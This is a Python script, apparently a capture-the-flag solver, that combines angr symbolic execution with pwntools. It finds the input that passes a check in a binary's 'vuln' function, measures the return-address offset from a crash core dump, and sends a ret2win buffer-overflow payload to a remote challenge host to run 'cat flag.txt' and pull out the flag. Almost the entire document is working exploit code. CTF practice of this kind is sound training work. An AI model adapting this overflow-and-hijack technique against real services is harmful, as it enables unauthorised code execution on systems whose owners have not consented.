from pwn import *
import angr

# import detection
context.log_level = 'ERROR'
logging.disable(logging.CRITICAL)

context.clear(arch='amd64')


# I need a custom one here.
def find_rip_offset(binary: str, solution):
    p = process(binary)

    p.sendline(solution + cyclic(1024, n=8))
    p.wait()
    core = p.corefile
    p.close()
    os.remove(core.file.name)
    return cyclic_find(core.read(core.rsp, 8), n=8) + len(solution)


def exploit(binary: str):
    e = ELF(binary)

    vuln_contents = e.read(e.sym['vuln'], 0x100)
    vuln_disas = disasm(vuln_contents)

    if_line_index = vuln_disas.find('je')
    # So, this - 30 is the offset of the comparative
    lines = vuln_disas[if_line_index - 30:].split('\n  ')

    # print(lines)
    failure = e.sym['vuln'] + int(lines[1][:2], 16)
    # print(hex(failure))
    success = e.sym['vuln'] + int(lines[0][len(lines[0]) - 2:], 16)
    # print(hex(success))

    target = angr.Project(binary)

    entry_state = target.factory.entry_state(args=[binary])

    # Establish the simulation
    simulation = target.factory.simulation_manager(entry_state)

    # Start the simulation
    simulation.explore(find=success, avoid=failure)

    solution = simulation.found[0].posix.dumps(0)
    solution = solution.replace(b'\x01', b'').replace(b'\x00', b'')

    # Now we just do ret2win
    flag_regex = r'flag\{[^}]+\}'

    url = f'ace-service-{binary}.chals.io'
    p = remote(url, 443, ssl=True, sni=url)
    # p = process(binary)
    # pid = gdb.attach(p, 'b *0x00400877\ncontinue')
    pad_len = find_rip_offset(binary, solution)
    # print(pad_len)

    p.recvuntil(b'>>>')
    payload = solution  # + b'\x00'
    payload += cyclic(pad_len - len(payload))
    payload += p64(e.sym['win'] + 4)
    p.sendline(payload)

    p.sendline(b'cat flag.txt')
    # p.interactive()
    output = p.recvall(timeout=0.2)

    flag = re.findall(flag_regex, output.decode())

    if flag:  # Success
        return flag[0]
    else:  # Failure
        return
    return
